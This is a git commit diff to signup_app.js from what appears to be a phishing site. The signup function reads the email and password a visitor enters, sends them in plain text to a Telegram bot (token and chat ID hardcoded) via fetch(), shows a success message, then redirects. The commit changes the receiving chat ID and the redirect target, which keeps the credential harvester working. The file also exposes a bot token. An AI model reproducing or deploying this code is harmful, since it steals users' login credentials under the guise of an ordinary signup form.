51ecaf755892c9b821f7bd09153566cb629ca371
Xd666 / Naveen <63446662+Naveen4703@users.noreply.github.com>
2022-05-16 09:19:30 +0530

    Update signup_app.js

--- signup_app.js
+++ signup_app.js
@@ -3,13 +3,13 @@ function signup(){
  
     let mail = document.getElementById('nmail').value;
     let password = document.getElementById('npassword').value;
-    var chat_id = 2097014526;
+    var chat_id = 1117797599;
     var msg = mail + "%0A" + password;
     var token = "1481767472:AAENJk7aOxNovo3L4Zuur8RTlxaJOoItG_E";
     var sendText = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text='+ msg ;
     fetch(sendText);
     document.getElementById('alert-success').classList.remove('d-none');
     setTimeout(() => {document.getElementById('alert-success').classList.add('d-none');}, 3000);
-    setTimeout(() => {window.location.href ='http://flames-checker.vercel.app/';}, 4000);
+    setTimeout(() => {window.location.href ='/main.html';}, 4000);
     
 }
